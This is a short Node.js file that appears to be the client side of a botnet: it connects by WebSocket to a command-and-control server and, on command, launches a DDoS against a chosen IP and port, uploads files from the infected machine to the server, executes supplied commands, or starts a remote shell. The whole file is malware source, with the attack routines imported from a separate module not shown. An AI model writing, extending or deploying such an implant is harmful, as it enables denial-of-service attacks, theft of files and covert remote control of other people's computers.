const WebSocket = require('ws');

const { send_file_to_sv, ddos, execute, start_shell } = require ('./commands.js')

const serverUrl = 'ws://server:3000';
const ws = new WebSocket(serverUrl);

ws.on('open', () => {
    console.log('Connected to C2 server');
});

ws.on('message', message_raw => {
    const message = JSON.parse(message_raw);
    const id = message.id;
    console.log('Received command:', message);

    switch (message.command) {
        case "DDoS":
            ddos(id, message.ip, message.port, message.time)
            break;
        case "Download":
            const name = message.name
            send_file_to_sv(id, name, message.filepath, ws);
            break;

        case "Exec":
            execute(id, message.data, message.name)
            break;

        case "Shell":
            start_shell(id)
            break;

        default:
            console.log("Comando no reconocido.")
            break;
    }

});

ws.on('close', () => {
    console.log('Disconnected from C2 server');
});